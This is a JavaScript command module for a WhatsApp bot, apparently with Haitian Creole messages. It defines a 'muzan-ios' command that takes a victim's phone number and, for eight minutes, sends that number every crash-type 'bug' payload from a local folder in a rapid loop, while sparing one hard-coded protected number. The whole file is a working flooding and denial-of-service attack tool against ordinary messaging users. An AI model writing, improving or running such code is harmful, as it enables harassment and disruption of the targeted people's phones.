const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'muzan-ios',
  desc: '🧨 Bug ultra rapide pou 8 minit ak tout payloads.',
  category: 'bug',
  react: '👺',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'muzan-ios') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await reply(`❌ Usage:\n${prefix}muzan-ios <numero>`);
    }

    const protected = ['13058962443'];
    if (protected.includes(targetNumber)) {
      return await reply('🛡️ Nimewo sa pwoteje. Atak anile.');
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugDir = path.join(__dirname, '../bugs');
    const bugs = fs.readdirSync(bugDir).filter(f => f.endsWith('.js'));

    if (bugs.length === 0) {
      return await reply('📁 Pa gen payload nan folder `/bugs`.');
    }

    // Voye IMG anvan atak
    const imagePath = path.join(__dirname, '../media/1.png');
    const img = fs.readFileSync(imagePath);
    await bot.sendMessage(from, {
      image: img,
      caption: `👺 *muzan-ios* ap frape:\n👤 wa.me/${targetNumber}\n⏱️ 8 minit\n🚀 Speed: 0.0005s\n📦 Payloads: ${bugs.length}`,
    }, { quoted: mek });

    const end = Date.now() + 8 * 60 * 1000;

    while (Date.now() < end) {
      for (const bugFile of bugs) {
        try {
          const bugPath = path.join(bugDir, bugFile);
          let payload = require(bugPath);

          if (typeof payload === 'object' && typeof payload.default === 'string') {
            const msg = payload.default;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'string') {
            const msg = payload;
            payload = async (bot, number) => {
              await bot.sendMessage(`${number}@s.whatsapp.net`, { text: msg });
            };
          }

          if (typeof payload === 'function') {
            await payload(bot, targetNumber);
          }

        } catch (e) {
          console.error(`❌ Error nan ${bugFile}:`, e.message);
        }

        await new Promise(r => setTimeout(r, 0.5)); // 0.5ms delay
      }
    }

    await reply(`✅ *muzan-ios* fini frape +${targetNumber}`);

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});